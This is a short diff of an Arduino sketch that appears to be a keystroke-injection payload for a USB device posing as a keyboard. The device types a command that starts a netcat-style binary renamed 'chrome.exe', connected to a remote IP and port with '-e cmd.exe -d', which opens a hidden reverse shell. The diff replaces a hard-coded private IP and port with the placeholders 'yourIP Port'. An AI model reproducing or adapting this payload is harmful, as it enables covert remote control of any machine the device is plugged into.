@@ -16,7 +16,7 @@ void setup() {
   type(KEY_RETURN, false);
   Keyboard.releaseAll();
   delay(800);
-  print(F("start chrome.exe 192.168.1.103 4443 -e cmd.exe -d"));
+  print(F("start chrome.exe yourIP Port -e cmd.exe -d"));
   delay(800);
   type(KEY_RETURN, false);
   Keyboard.releaseAll();
